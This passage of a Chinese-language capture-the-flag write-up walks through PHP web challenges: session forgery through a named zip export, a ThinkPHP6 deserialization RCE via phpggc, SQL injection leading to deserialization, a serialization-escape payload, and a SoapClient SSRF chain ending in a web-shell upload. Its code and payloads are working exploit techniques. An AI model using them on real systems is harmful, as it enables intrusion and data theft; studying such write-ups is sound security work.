application/zip'</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>几个点</p>
<ul>
<li>如果导出类型不是tar的话就会生成并覆盖写文件<code>ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE</code></li>
<li>session存储的目录和压缩包存储的目录是一样的</li>
<li>压缩包的名字可控</li>
</ul>
<p>那么思路就是添加笔记的时候写入session序列化字符串片段, 并将它导出压缩包, 但是控制压缩包的名字为sess_xxxxxxx, 这样就会生成一个新的session, 然后利用拿到的这个session去获取flag就可以啦</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用用户名sess_登录</span><br><span class="line">添加note , title为|N;admin|b:1;</span><br><span class="line">导出note, 用burpsuite抓包, 修改type为.</span><br><span class="line">利用导出的sessionid去getflag</span><br></pre></td></tr></table></figure>
<p>然后关于序列化字符串这里, php默认是键名+|+序列化字符串</p>
<p>比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_save_path(<span class="string">"./uploads"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'test'</span>]=<span class="string">"test"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20191230164250536.png" alt="image-20191230164250536"></p>
<h2 id="安洵杯-2019-iamthinking">安洵杯 2019 iamthinking</h2>
<p>thinkphp6 反序列化</p>
<p><a href="https://xz.aliyun.com/t/6479" target="_blank" rel="noopener">https://xz.aliyun.com/t/6479</a></p>
<p><a href="https://www.freebuf.com/column/221939.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221939.html</a></p>
<p><a href="https://www.anquanke.com/post/id/187393" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187393</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这是controller下的index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='../test.jpg'"</span>.<span class="string">"/&gt;"</span>;</span><br><span class="line">        $paylaod = @$_GET[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($paylaod))</span><br><span class="line">        &#123;</span><br><span class="line">            $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">            parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">            <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/^O/i"</span>,$value))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'STOP HACKING'</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            unserialize($paylaod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了绕过正则表达式</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70891231-cf2c0680-2021-11ea-86a3-b47fa58a89a4.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916320-70cd4b00-2056-11ea-83b9-b4b3d8460b42.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916355-80e52a80-2056-11ea-993c-7e4acce3c4ac.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916397-93f7fa80-2056-11ea-87a0-b0a2d7eab448.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916575-e0433a80-2056-11ea-8975-56f1fc768803.png" alt="image"></p>
<p>生成poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 &apos;system(&quot;cat /flag&quot;);&apos;</span><br></pre></td></tr></table></figure>
<p>打</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70889818-67c08780-201e-11ea-9f7d-bc9a5416829a.png" alt="image"></p>
<h2 id="安洵杯-2019-这不是文件上传">安洵杯 2019 这不是文件上传</h2>
<p>从前端源码中获取几个特征关键词, 上github搜索之后可以发现源代码, 审计:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload.php</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file = <span class="keyword">new</span> upload();</span><br><span class="line">		$file-&gt;upload_base();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line">	<span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">		$show-&gt;Delete_All_Images();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $con;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   			<span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">					<span class="comment">// 这里存在反序列化, 可以触发helper类的函数来达到读取flag的目的</span></span><br><span class="line">                    $attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">helper.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">		$array = <span class="keyword">array</span>();</span><br><span class="line">		$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">		$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">		$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">		$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">		$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">		$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">		<span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">			$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $rs;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">		$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">		$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">		$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">		$sql_val = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">			$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// 由于这里是直接拼接上去的, 那么可以考虑sql注入, 来将payload插入到数据库中, 然后在查看的图片的时候就可以触发反序列化</span></span><br><span class="line">		$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">True</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cc = serialize(<span class="keyword">new</span> helper());</span><br><span class="line"><span class="keyword">echo</span> bin2hex($cc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/70434879-68a66600-1ac0-11ea-9290-b5070cb2ea10.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70434993-af945b80-1ac0-11ea-9ae0-cc156bf7b1c2.png" alt="image"></p>
<h2 id="安洵杯-2019-easy-serialize-php">安洵杯 2019 easy_serialize_php</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在phpinfo中的<code>auto_append_file</code>找到了d0g3_f1ag.php.</p>
<p>extract($_POST); 存在变量覆盖漏洞, 可以拿他来覆盖session变量, 然后利用题目中的过滤函数巧妙解析自己的序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload : _SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">经过序列化之后 :</span><br><span class="line">a:1:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</span><br><span class="line">经过过滤函数之后</span><br><span class="line">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</span><br><span class="line">此时&quot;;s:48&quot;成为了s:7的值, 末尾的;&#125;解析失败不影响结果</span><br></pre></td></tr></table></figure>
<p>从d0g3_f1ag.php读到了flag路径, 然后再依法炮制读flag即可.</p>
<h2 id="De1ta-ctf-2019-shellshellshell">De1ta ctf 2019 shellshellshell</h2>
<p>开局扫描并得到了index.php~, config.php~, user.php~, 等源码, 关键代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">config.php   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">        $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">        $nid =</span><br><span class="line">        $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user.php</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">                $db = <span class="keyword">new</span> Db();</span><br><span class="line">                @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">                <span class="keyword">if</span>($ret)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                    move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>观察insert 函数发现他会把一对中间没有逗号的反引号转义成一对单引号, 那么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1#` 就会变成 (`1#``) 然后变成(&apos;1#&apos;`)</span><br></pre></td></tr></table></figure>
<p>这样就可以逃逸出来了.</p>
<p>注入点在signature, 是二次注入的手法</p>
<p>为了能让注入的信息正常回显, 注入两行数据的时候要保证第一行的数据也是正常的否则会因为mood对象解析失败而无法回显.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70115181-e706a080-1699-11ea-91ac-f484008eed33.png" alt="image"></p>
<p>得到密码之后尝试登录 , 发现禁止了, 只允许本地登录, 那么可以考虑ssrf.</p>
<p>注意到payload中mood对象是会被反序列化处理的, 那么如果这个位置的对象换成soapclient 的话, 对象反序列化时候就会触发魔法方法去发起请求</p>
<p>生成任意报文post的poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://123.206.216.198/bbb.php'</span>;</span><br><span class="line">$post_string = <span class="string">'a=b&amp;flag=aaa'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后这样操作</p>
<ul>
<li>开两个登录页面, 保证sessionid不同</li>
<li>其中一个session 登录并publish一个soapclient对象</li>
<li>soapclient对象反序列化向内网发起请求, 请求的参数是admin用户名和密码以及第二个session和第二个session的验证码</li>
<li>然后将页面切换到拥有第二个session的登录界面, 刷新以下这个session就可以以admin身份登录了</li>
</ul>
<p>登录之后是一个上传, 传了个shell扫一下内网, 发现</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70115766-b0ca2080-169b-11ea-8f6d-ceab4d91b3bd.png" alt="image"></p>
<p>上海大学生的原题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="comment"># filename要得是数组</span></span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span 